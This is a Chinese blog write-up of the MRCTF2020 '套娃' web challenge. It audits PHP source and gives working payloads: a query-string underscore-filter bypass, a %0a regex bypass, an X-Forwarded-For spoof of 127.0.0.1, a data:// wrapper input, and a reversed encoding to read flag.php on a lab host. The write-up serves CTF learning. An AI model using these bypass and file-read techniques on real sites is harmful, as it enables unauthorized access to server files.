---
title: MRCTF2020套娃
date: 2024-05-26 19:29:16
tags: 题解
categories: 刷题笔记
---

## [MRCTF2020]套娃

我们打开页面源码，出现提示信息

<!-- more -->

```
<!--
//1st
$query = $_SERVER['QUERY_STRING'];

 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
    die('Y0u are So cutE!');
}
 if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
    echo "you are going to the next ~";
}
!-->
```

开始进行代码审计

$_SERVER['QUERY_STRING']   作用为获取字符串的内容



```
 if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )
```

substr_count()函数计算子串在字符串中出现的次数
子串区分大小写，意思是$query中不能出现_和%5f（\_）



```
if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t']))
```

意思为传入一个参数b_u_p_t且不等于23333但正则要匹配到23333（正则匹配中’^‘和’$'代表的是行的开头和结尾,所以能利用换行绕过），我们可以使用%0a绕过正则匹配

我们要先绕过第一个if语句

由于上述代码不能出现’_‘和’%5f’，可以用‘ ’或‘.’或‘ %5F’绕过

```
payload
?b u p t=23333%0a

```

![image-20240526195902450](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405261959734.png)

成功绕过，现在页面提示flag就在这里，我们需要怎么得到它

我们查看页面源码，有一串好长好长的注释

![image-20240526200016188](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405262000261.png)

经过查询资料可知，这是**jsfuck代码**

我们打开控制台，输入这串代码

![image-20240526200125829](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405262001095.png)

页面弹出需要post一个Merak，我们随便给他一个值，得到源码

![image-20240526200217721](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405262002870.png)

```
<?php 
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';

if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 


function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```

然后又是代码审计

```
if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 
```

需要post一个Merak才能显示代码

```
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
```

对传入的v进行base64解码，再进行加密处理

```
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
```

ip地址需为127.0.0.1才能绕过if语句，同时需往2333中读取一个todat is a happy day

所以这里修改

```
X-Forwarded-For:127.0.0.1
?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
```

开始解题

这题最关键的一步是使change($_GET['file'])变为flag.php

我们进行逆向，先反向给v的每一个字符的ascill进行减法，在进行base64加密，这样得到值再通过原本的change后为flag.php

```
<?php
function change($v){
$re = '';
for($i=0;$i<strlen($v);$i++){
$re .= chr ( ord ($v[$i]) - $i*2 );
}
return base64_encode($re);
}
$a=change("flag.php");

echo $a;

ZmpdYSZmXGI=
```

由于存在post参数Merak，会使文件die，所以我们要先关闭post传参，再输入payload

```
http://388dfe15-03fe-4c9e-b855-642e04bdcccc.node5.buuoj.cn:81/secrettw.php?file=ZmpdYSZmXGI=&2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=
```

![image-20240526202042170](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405262020234.png)

flag在页面源码里
